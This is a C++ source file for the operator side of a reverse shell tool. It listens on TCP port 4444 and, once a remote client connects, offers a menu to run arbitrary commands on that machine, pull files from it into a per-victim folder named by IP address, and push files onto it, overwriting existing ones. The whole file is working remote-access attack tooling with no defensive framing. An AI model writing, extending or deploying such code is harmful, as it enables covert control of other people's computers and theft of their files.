#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdlib.h>
#include "Server.h"
#include <iostream>

// TODO - take this function to "common utils"
std::string EnvVariable(const std::string& envVariable)
{
    char* buf = nullptr;
    size_t sz = 0;
    return (_dupenv_s(&buf, &sz, envVariable.c_str()) == 0 && buf != nullptr) ? std::string(buf) : "Error";
}

Server::Server()
    : ReverseShellStandard()
{
    std::cout << "Server started" << std::endl;
    Connect();
    ClientDedicatedDirectory();
    Start();
    m_ioService.run();
}

void Server::Connect()
{
    auto endpoint = boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), 4444);
    auto acceptor = boost::asio::ip::tcp::acceptor(m_ioService, endpoint);
    acceptor.accept(m_socket, m_errorCode);
    if (m_errorCode)
        throw; // TODO - throw specific
}

void Server::ClientDedicatedDirectory()
{
    SetClientDedicatedDirectory();
    CreateClientDedicatedDirectory();
    std::filesystem::current_path(m_clientDedicatedDirectory);
}

void Server::Start()
{
    while (true)
    {
        switch (ReadOperationType())
        {
        case RUN_COMMAND:
            RunCommand();
            break;
        case DOWNLOAD_FILE:
            DownloadFile();
            break;
        case UPLOAD_FILE:
            UploadFile();
            break;
        default:
            InvalidOperation();
            break;
        }

        m_responseBuf.consume(m_responseBuf.size());
    }
}

void Server::SetClientDedicatedDirectory()
{
    std::string userHomeDirectory(EnvVariable("USERPROFILE"));
    std::string clientIp(m_socket.remote_endpoint().address().to_string());
    std::cout << "Connected to: " << clientIp << std::endl;
    m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dst" / clientIp).string();
}

void Server::CreateClientDedicatedDirectory()
{
    std::filesystem::create_directory(m_clientDedicatedDirectory);
    std::cout << "Created directory: " << m_clientDedicatedDirectory << std::endl;
}

Server::OperationType Server::ReadOperationType()
{
    PrintOptionsMenu();
    std::string operation;
    std::getline(std::cin >> std::ws, operation);

    return GetOperationType(operation);
}

void Server::PrintOptionsMenu()
{
    std::cout << "\n\n============  Choose an operation ============\n"
        << "1) Run command\n"
        << "2) Download file\n"
        << "3) Upload file\n"
        << "[+] Your choise - ";
}

void Server::RunCommand()
{
    auto command = ReadOperationInstruction("Write command");
    Send(RUN_COMMAND);
    Send(command);
    auto commandOutput = Response();
    std::cout << std::endl << commandOutput << std::endl;
}

std::string Server::ReadOperationInstruction(const std::string& operation)
{
    std::cout << "\n\n[+]" << operation << ": ";
    std::string instruction;
    std::getline(std::cin >> std::ws, instruction);
    RemoveUnnecessaryQuotationMark(instruction);
    return instruction;
}

void Server::RemoveUnnecessaryQuotationMark(std::string& string)
{
    if (string.front() == '\"' && string.back() == '\"')
        string = string.substr(1, string.length() - 2);
}

void Server::DownloadFile()
{
    auto filePath = ReadOperationInstruction("Source path (remote)");
    Send(DOWNLOAD_FILE);
    Send(filePath);

    if (Response() == "0")
    {
        std::cout << "Client doesn't have the file:  " << filePath << std::endl;
        return;
    }

    auto fileToCreate = CreateFileLocally(filePath);
    ReverseShellStandard::DownloadFile(filePath);
    std::cout << "File downloaded to - " << fileToCreate << std::endl;
}

void Server::UploadFile()
{
    auto localFilePath = ReadOperationInstruction("Source path (local)");
    if (!IsRegularFileExists(localFilePath))
    {
        std::cout << localFilePath << " file doesn't exist locally" << std::endl;
        return;
    }

    auto destinationFilePath = ReadOperationInstruction("Destination path (remote)");
    Send(UPLOAD_FILE);
    Send(destinationFilePath);

    if (Response() != "0")
        std::cout << destinationFilePath << " already exists on the client. It will be overwitten!" << std::endl;

    ReverseShellStandard::UploadFile(localFilePath);
    std::cout << "File uploaded to (remote): " << destinationFilePath << std::endl;
}

void Server::InvalidOperation()
{
    std::cout << "Invalid operation! Type the number of an option from the menu!" << std::endl;
}

std::string Server::CreateFileLocally(const std::string& filePath)
{
    auto fileName = std::filesystem::path(filePath).filename().string();
    auto fileToCreate = (std::filesystem::path(m_clientDedicatedDirectory) / fileName).string();
    OpenFileFor(fileToCreate, std::ios::out | std::ios::binary);

    return fileToCreate;
}


























































































